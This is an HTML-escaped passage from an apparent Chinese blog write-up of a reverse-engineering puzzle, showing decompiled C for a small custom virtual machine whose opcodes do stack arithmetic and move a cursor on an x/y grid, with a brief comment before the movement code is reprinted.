LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code != &lt;span class=&#34;number&#34;&gt;0xCA&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0x6A&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          *(_BYTE *)sRSP -= BYTE1(s);           &lt;span class=&#34;comment&#34;&gt;// [rsp] - [code]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *(_BYTE *)sRSP = BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;54&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *(_BYTE *)sRSP = sub_CBE();                 &lt;span class=&#34;comment&#34;&gt;// push 1 bytes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code &amp;gt; &lt;span class=&#34;number&#34;&gt;0x36&lt;/span&gt;u )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0x45&lt;/span&gt; )        &lt;span class=&#34;comment&#34;&gt;// push 4byte&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)sRSP = BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)sRSP = BYTE2(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)sRSP = BYTE3(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)sRSP = BYTE4(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code &amp;gt; &lt;span class=&#34;number&#34;&gt;0x45&lt;/span&gt;u )   &lt;span class=&#34;comment&#34;&gt;// BYTEx是对64位code进行拆分,0为最低位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;73&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (BYTE2(s) &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)BYTE1(s) &amp;lt;= size_X &amp;amp;&amp;amp; (BYTE4(s) &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)BYTE3(s) &amp;lt;= size_Y )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          x_temp = (BYTE2(s) &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          y_temp = (BYTE4(s) &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + BYTE3(s);  &lt;span class=&#34;comment&#34;&gt;// 设置下一个start的位置，相当于jmp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;82&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_BYTE *)sRSP += BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;65&lt;/span&gt; &amp;amp;&amp;amp; BYTE1(s) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)sRSP = *(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)sRSP / (__int16)BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x13&lt;/span&gt;u:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( chance &amp;lt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )                      &lt;span class=&#34;comment&#34;&gt;// 重置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        set_code_data();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_E91();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        --chance;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x33&lt;/span&gt;u:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_BYTE *)sRSP ^= BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt;u:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_BYTE *)sRSP *= BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_55:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; ( HIBYTE(s) )                          &lt;span class=&#34;comment&#34;&gt;// 最后一字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);                          &lt;span class=&#34;comment&#34;&gt;// x-1,y-1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);                           &lt;span class=&#34;comment&#34;&gt;// y-1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);                           &lt;span class=&#34;comment&#34;&gt;// x+1，y-1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);                           &lt;span class=&#34;comment&#34;&gt;// x-1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);                            &lt;span class=&#34;comment&#34;&gt;// x+1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);                           &lt;span class=&#34;comment&#34;&gt;// x-1,y+1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);                            &lt;span class=&#34;comment&#34;&gt;// y+1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);                            &lt;span class=&#34;comment&#34;&gt;// x+1,y+1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_65:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      result = &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;End!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      result = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看着这一摊东西，忍不住骂娘。&lt;/p&gt;
&lt;p&gt;先看最简单的，如何实现移动，也就是对 x,y 的操作&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; ( HIBYTE(s) )                          &lt;span class=&#34;comment&#34;&gt;// 最后一字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);                          &lt;span class=&#34;comment&#34;&gt;// x-1,y-1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);                           &lt;span class=&#34;comment&#34;&gt;// y-1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);                           &lt;span class=&#34;comment&#34;&gt;// x+1，y-1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);                           &lt;span class=&#34;comment&#34;&gt;// x-1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);                            &lt;span class=&#34;comment&#34;&gt;// x+1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);                           &lt;span class=&#34;comment&#34;&gt;// x-1,y+1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);                            &lt;span class=&#34;comment&#34;&gt;// y+1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_65;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_F6F(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);                            &lt;span class=&#34;comment&#34;&gt;// x+1,y+1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_65:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      result = &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;End!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      result = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span 